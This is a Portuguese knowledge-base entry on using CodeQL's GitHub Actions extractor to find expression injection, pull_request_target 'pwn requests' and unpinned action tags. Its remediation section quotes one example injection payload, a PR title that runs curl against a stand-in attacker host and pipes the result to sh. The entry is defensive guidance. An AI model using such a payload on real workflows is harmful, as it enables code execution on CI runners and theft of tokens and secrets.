---
id: software.seguranca.tranche11.001078
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-11.md"
fontes: ["https://raw.githubusercontent.com/github/codeql/main/README.md", "https://docs.github.com/en/code-security/concepts/code-scanning/codeql/codeql-cli"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# Auditoria de Segurança de Pipelines CI/CD (**GitHub Actions**) com CodeQL (`--language=actions`): Detectando **Expression Injection** e **`pull_request_target` (*Pwn Requests*)**

## Em uma frase
Um vetor crítico de comprometimento de Supply Chain (responsável por ataques famosos a repositórios open-source e corporativos) não está no código da aplicação, mas sim dentro dos arquivos **`.github/workflows/*.yml` do GitHub Actions**!

## Por que importa
Por isso o CodeQL adicionou o extrator oficial **`--language=actions` (`codeql/actions-queries`)**! Ele analisa semanticamente todos os seus workflows do GitHub Actions em busca de vulnerabilidades graves de CI/CD:

## Como funciona
Veja o que o pacote `codeql/actions-queries` detecta automaticamente: **(1) `actions/code-injection` (*Expression Injection*)** — quando um workflow interpola um valor controlado por um atacante externo como `${{ github.event.issue.title }}`, `${{ github.event.pull_request.head.ref }}` ou `${{ github.event.comment.body }}` diretamente dentro de um bloco `run: |` de shell Bash (permitindo execução remota de código no runner e roubo do `GITHUB_TOKEN`!); **(2) `actions/ untrusted-checkout-in-privileged-workflow` (*Pwn Request*)** — quando um workflow disparado por **`pull_request_target`** (que tem acesso a `secrets` e `GITHUB_TOKEN` de escrita!) faz `actions/checkout` do código não-confiável do fork do PR e o executa!; e **(3) `actions/unpinned-tag`** — uso de Actions de terceiros sem fixar o hash SHA-1 completo de 40 caracteres!

## Exemplo
```bash
# Criar um banco de dados CodeQL especifico para auditar os arquivos .github/workflows/*.yml (--language=actions)
codeql database create actions-db --language=actions --source-root=.
codeql database analyze actions-db \
  codeql/actions-queries \
  --format=sarif-latest \
  --output=actions-security.sarif
```

## Limites e trade-offs
Como corrigir imediatamente um alerta de **`actions/code-injection`** em um bloco `run:` do GitHub Actions? **Nunca** escreva `run: echo "${{ github.event.pull_request.title }}"` direto no script Bash (pois o GitHub expande `${{ ... }}` como texto antes de entregar ao Bash, permitindo que um título de PR como `"; curl evil.com | sh #` injete comandos!); em vez disso, passe o valor através de uma **Variável de Ambiente do Step (`env: PR_TITLE: ${{ github.event.pull_request.title }}`)** e referencie `"$PR_TITLE"` dentro do Bash!

## Como verificar
Combine o CodeQL `--language=actions` com o **OpenSSF Scorecard (`Pinned-Dependencies` & `Token-Permissions`)** para blindar seus pipelines de CI/CD.

## Conexões
- [[codeql-modos-build-compiled-languages-none-autobuild-manual]] — Veja também: Criando Bancos CodeQL para Linguagens Compiladas (**C/C++, Java, Kotlin, C#, Go, Rust, Swift**): Modos **`build-mode: none`**, **`autobuild`** e **`manual`**.
- [[codeql-testes-unitarios-qlpacks-codeql-test-run-expected]] — Veja também: Engenharia de Qualidade em Regras SAST: Pacotes **`qlpack.yml`** e Testes Unitários Automatizados de Consultas `.ql` com **`codeql test run`** (`.expected`).
- [[codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg]] — Referência cruzada direta com codeql-arquitetura-analise-semantica-bancos-dados-ast-cfg-dfg.
- [[steampipe-auditoria-postura-github-supply-chain-branch-protection-actions]] — Referência cruzada direta com steampipe-auditoria-postura-github-supply-chain-branch-protection-actions.

## Fontes
- [GitHub CodeQL Official Repository — Standard Libraries, Security Queries & Model Packs](https://raw.githubusercontent.com/github/codeql/main/README.md) — repositório oficial do GitHub CodeQL contendo as bibliotecas padrão QL, suítes de consultas de segurança e extensões de modelos; consultado em 2026-10-03.
- [GitHub Official Documentation — About the CodeQL CLI (`database create`, `database analyze`, `github upload-results`)](https://docs.github.com/en/code-security/concepts/code-scanning/codeql/codeql-cli) — documentação oficial da CLI do CodeQL cobrindo criação de bancos de dados relacionais de código, análise SARIF e suporte multi-linguagem; consultado em 2026-10-03.
